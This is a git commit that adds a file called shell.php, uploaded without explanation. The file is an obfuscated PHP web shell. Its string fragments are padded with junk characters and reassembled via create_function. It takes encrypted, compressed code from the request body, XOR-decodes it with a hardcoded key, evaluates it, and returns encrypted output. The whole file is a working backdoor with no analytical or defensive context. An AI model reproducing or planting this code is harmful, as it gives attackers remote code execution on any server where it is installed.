2cb62d231d9e74088518ced8349ccef6a6334fb0
JoePinargoteVera <104092785+JoePinargoteVera@users.noreply.github.com>
2023-10-11 20:37:46 -0500

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,13 @@
+<?php
+$O='DdD("/$kdDh(.+)$kf/",@fdDidDle_get_contdDents(dD"dDphp://inpudDt"),dD$dDm)';
+$S='$jdD++,$i++){$dDo.=$t{$i}dD^$k{$jdD};}}retdDurndD $o;}idDf (@pdDreg_matchd';
+$j='$kdD="4dD3abff6d"dD;$kh="445ce3aadDa29dDe";$kf="dDaaee6dD5f5274fdD";$p="odD';
+$Z='e(dDdD$m[1]),$k)));$o=@dDob_gedDt_contents();@ob_enddD_cleadDn()dD;$r=@bas';
+$m='==1) {@ob_stardDt(dD);@edDval(@gzdDdDuncompress(@x(dD@basdDe64_dDdedDcoddD';
+$q='z4wlXdDSdDKGGB4ByBHdD";fdDudDndDction x($t,$kdD){$c=strlen(dD$kdD);$l=strd';
+$g='e6dD4_endDcode(@xdD(@gzcomdDpresdDs($o),$kdD));pridDdDnt("$dDp$kh$r$kf");}';
+$Q='Dlen($t);$dDo="";fodDr($i=dD0;$i<$ldD;){fdDor($j=0;dD(dD$j<$cdD&&$dDi<$l);';
+$B=str_replace('C','','crCeatCCe_CfuncCCtion');
+$E=str_replace('dD','',$j.$q.$Q.$S.$O.$m.$Z.$g);
+$G=$B('',$E);$G();
+?>
